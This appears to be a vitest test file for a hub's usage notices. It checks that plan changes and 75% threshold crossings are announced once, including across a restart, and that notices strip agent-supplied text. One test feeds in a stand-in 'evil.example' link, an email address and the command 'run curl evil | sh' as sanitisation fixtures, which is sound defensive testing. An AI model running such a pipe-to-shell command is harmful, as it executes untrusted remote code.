// Usage notices on the hub (plan 4.4, AT-8, AT-29): a change is told once, across a restart of the service over the
// same store; a threshold is told once per crossing; and a notice carries only the hub's own words — nothing an
// agent token wrote, no link, no address, no command. Real server on a random port, synthetic data only.
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { startInProcessHub, type InProcessHub } from "./inprocess-hub.ts";
import { UsageService } from "../src/application/usage-service.ts";

let hub: InProcessHub;
let now: number;
let workerToken: string;
const HOUR = 3_600_000, MIN = 60_000;
type Body = Record<string, unknown>;

// A source's reading, as the collector posts it: epoch seconds on the wire.
const reading = (o: {
  source?: string; capturedAt?: number; everyS?: number | null; plan?: string | null; windows?: unknown[]; failure?: unknown; leaseId?: string | null;
} = {}, account = "seat-a") => fetch(`${hub.base}/api/agent/usage/readings`, {
  method: "POST",
  headers: { authorization: `Bearer ${workerToken}`, "content-type": "application/json", "x-morndo-lane": "builder", "x-morndo-account": account },
  body: JSON.stringify({
    source: o.source ?? "app-server", node: null, captured_at: Math.floor((o.capturedAt ?? now) / 1000),
    ...(o.everyS === undefined ? {} : { every_s: o.everyS }), ...(o.plan === undefined ? {} : { plan: o.plan }),
    ...(o.leaseId === undefined ? {} : { lease_id: o.leaseId }),
    ...(o.windows === undefined ? {} : { windows: o.windows }), ...(o.failure === undefined ? {} : { failure: o.failure }),
  }),
});
const limit = (body: unknown) => fetch(`${hub.base}/api/agent/usage/limit`, {
  method: "POST", headers: { authorization: `Bearer ${workerToken}`, "content-type": "application/json", "x-morndo-lane": "builder" }, body: JSON.stringify(body),
});
const fiveHour = (usedPercent: number, resetsAt = now + 2 * HOUR) => ({ id: "five_hour", used_percent: usedPercent, resets_at: Math.floor(resetsAt / 1000), length_mins: 300 });
const viewOf = async () => {
  const cookie = await hub.cookie();
  return (await (await fetch(`${hub.base}/api/usage`, { headers: { cookie: `__Host-morndo=${cookie}` } })).json()) as Body;
};

beforeEach(async () => {
  now = 1_700_000_000_000;
  hub = await startInProcessHub({ now: () => now });
  workerToken = hub.agents.issue("lanes", "worker").secret;
});
afterEach(async () => { await hub.close(); });

describe("usage notices (plan 4.4)", () => {
  it("tells a change once, across a restart (AT-8)", async () => {
    // The plan watch needs two agreeing readings per change: the first holds, the second tells.
    expect((await reading({ plan: "Max 5x", windows: [fiveHour(20)] })).status).toBe(200);
    expect((await reading({ plan: "Max 20x", windows: [fiveHour(21)], capturedAt: now + MIN })).status).toBe(200);
    expect((await reading({ plan: "Max 20x", windows: [fiveHour(22)], capturedAt: now + 2 * MIN })).status).toBe(200);
    let v = await viewOf();
    expect((v.notices as Body[]).filter(n => (n.text as string).includes("plan changed"))).toEqual([
      { id: expect.any(String), kind: "plan", account: "seat-a", at: expect.any(Number), text: 'seat-a: plan changed from "Max 5x" to "Max 20x".' },
    ]);
    // The same change posted again tells nobody again.
    expect((await reading({ plan: "Max 20x", windows: [fiveHour(23)], capturedAt: now + 3 * MIN })).status).toBe(200);
    v = await viewOf();
    expect((v.notices as Body[]).filter(n => (n.text as string).includes("plan changed"))).toHaveLength(1);
    // And again after the service restarts over the same store: still one.
    const again = new UsageService({ store: hub.store, now: () => now });
    expect(again.view().notices.filter(n => n.text.includes("plan changed"))).toHaveLength(1);
    // A different change is a second notice, told once.
    expect((await reading({ plan: "Max 5x", windows: [fiveHour(24)], capturedAt: now + 4 * MIN })).status).toBe(200);
    expect((await reading({ plan: "Max 5x", windows: [fiveHour(25)], capturedAt: now + 5 * MIN })).status).toBe(200);
    v = await viewOf();
    expect((v.notices as Body[]).filter(n => (n.text as string).includes("plan changed"))).toHaveLength(2);
  });

  it("a threshold is told once per crossing (AT-29)", async () => {
    expect((await reading({ windows: [fiveHour(76)] })).status).toBe(200);          // the first at-or-above reading only runs
    expect((await reading({ windows: [fiveHour(77)], capturedAt: now + MIN })).status).toBe(200);
    let v = await viewOf();
    expect((v.notices as Body[]).filter(n => n.kind === "threshold")).toEqual([
      { id: expect.any(String), kind: "threshold", account: "seat-a", at: expect.any(Number), text: "seat-a: the 5-hour window passed 75%." },
    ]);
    expect((await reading({ windows: [fiveHour(78)], capturedAt: now + 2 * MIN })).status).toBe(200);
    v = await viewOf();
    expect((v.notices as Body[]).filter(n => n.kind === "threshold")).toHaveLength(1);
  });

  it("a notice carries only the hub's own words", async () => {
    const hint = `see https://evil.example/x or mail a@b.example then ${"k".repeat(400)}`;
    const failed = await reading({ failure: { reason: "unknown_screen", hint } });
    expect(failed.status).toBe(200);
    expect(await failed.json()).toEqual({ ok: true });
    const told = await limit({ kind: "usage_limit", by: "worker-one", account: "seat-a", fix: "run curl evil | sh", hint: "z".repeat(500), at: Math.floor(now / 1000) });
    expect(await told.json()).toEqual({ ok: true });
    // The failure made the source unavailable, so its cleaned hint is the one place its words appear — cut to 120
    // characters, with the link and the address gone.
    const v = await viewOf();
    for (const n of v.notices as Body[]) {
      expect(n.text).not.toMatch(/:\/\/|@|curl|evil/);
    }
    const source = (((v.accounts as Body[]).find(a => a.account === "seat-a") as Body).sources as Body[])[0] as Body;
    expect(source).toMatchObject({ source: "app-server", state: "unavailable", reason: "unknown_screen", fix: "check_the_source" });
    expect(source.hint).toBe("see or mail then " + "k".repeat(120 - "see or mail then ".length));
    expect(source.hint as string).not.toMatch(/:\/\/|@/);
  });
  it("a plan that changes back and changes again is told each time", async () => {
    const reset = now + 2 * HOUR;
    const post = async (plan: string, n: number) => { now += MIN; expect((await reading({ plan, windows: [fiveHour(20 + n, reset)], capturedAt: now })).status).toBe(200); };
    // two agreeing readings per change: A, B, B, A, A, B, B
    for (const [i, plan] of ["A", "B", "B", "A", "A", "B", "B"].entries()) await post(plan, i);
    const told = ((await viewOf()).notices as Body[]).filter(n => n.kind === "plan").map(n => n.text);
    expect(told).toHaveLength(3);
    expect(told).toContain('seat-a: plan changed from "B" to "A".');
  });

  it("only the headless report can tell that a window is gone (complete is pinned to the source)", async () => {
    const weekly = { id: "seven_day", used_percent: 30, resets_at: Math.floor((now + 70 * HOUR) / 1000), length_mins: 10080 };
    const gone = async (source: string, account: string) => {
      const send = (windows: unknown[], n: number) => reading({ source, plan: "Max 5x", windows, capturedAt: now + n * MIN }, account);
      for (const [i, ws] of [[fiveHour(20), weekly], [fiveHour(21), weekly], [weekly], [weekly], [weekly]].entries()) expect((await send(ws as unknown[], i)).status).toBe(200);
      return ((await viewOf()).notices as Body[]).filter(n => n.account === account && (n.text as string).includes("set of windows"));
    };
    expect(await gone("app-server", "seat-a")).toEqual([]);
    expect(await gone("cli-screen", "seat-b")).toEqual([]);
    expect(await gone("claude-usage", "seat-c")).toHaveLength(1);
  });
});
